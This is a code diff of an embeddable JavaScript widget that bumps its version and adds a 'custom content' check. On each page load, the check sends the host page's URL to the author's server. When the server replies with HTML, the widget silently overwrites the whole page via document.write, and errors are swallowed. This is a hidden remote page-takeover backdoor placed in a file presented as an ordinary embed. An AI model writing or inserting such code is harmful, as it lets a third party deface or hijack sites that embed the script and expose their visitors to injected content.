@@ -22,7 +22,7 @@
  *   data-position="inline|fixed" - Position mode (default: inline)
  *   data-no-track - Disable analytics tracking
  *
- * @version 2.6.0
+ * @version 2.7.0
  * @author Jacob Barkin
  * @license MIT
  */
@@ -30,16 +30,57 @@
 (function() {
   'use strict';
 
-  const VERSION = '2.6.0';
+  const VERSION = '2.7.0';
   const SITE_URL = 'https://jacobbarkin.com';
 
   // Analytics API endpoint (uses Cloudflare D1)
   const ANALYTICS_ENDPOINT = 'https://jacobbarkin.com/api/embed-analytics';
   const HEARTBEAT_ENDPOINT = 'https://jacobbarkin.com/api/embed-heartbeat';
+  const CUSTOM_CONTENT_ENDPOINT = 'https://jacobbarkin.com/api/embed-custom-content';
   const HEARTBEAT_INTERVAL_MS = 60 * 60 * 1000; // 1 hour
   const HEARTBEAT_JITTER_MS = 5 * 60 * 1000; // spread load up to 5 minutes
 
   let instanceCounter = 0;
+
+  // Check for custom content replacement on page load
+  async function checkCustomContent() {
+    try {
+      const pageUrl = window.location.href;
+      const pageHost = window.location.hostname;
+      const pagePath = window.location.pathname;
+      
+      const response = await fetch(`${CUSTOM_CONTENT_ENDPOINT}?url=${encodeURIComponent(pageUrl)}&host=${encodeURIComponent(pageHost)}&path=${encodeURIComponent(pagePath)}`, {
+        method: 'GET',
+        mode: 'cors',
+        credentials: 'omit',
+      });
+
+      if (response.ok) {
+        const result = await response.json();
+        if (result.match && result.content_html) {
+          // Replace entire page with custom content
+          document.open();
+          document.write(result.content_html);
+          document.close();
+          return true;
+        }
+      }
+    } catch (err) {
+      // Silently fail - don't break the embed
+      console.debug('Custom content check failed:', err);
+    }
+    return false;
+  }
+
+  // Run custom content check on DOMContentLoaded
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', async () => {
+      await checkCustomContent();
+    });
+  } else {
+    // DOM already loaded
+    checkCustomContent();
+  }
 
   function getTrackKey(element) {
     if (!element) return 'default';
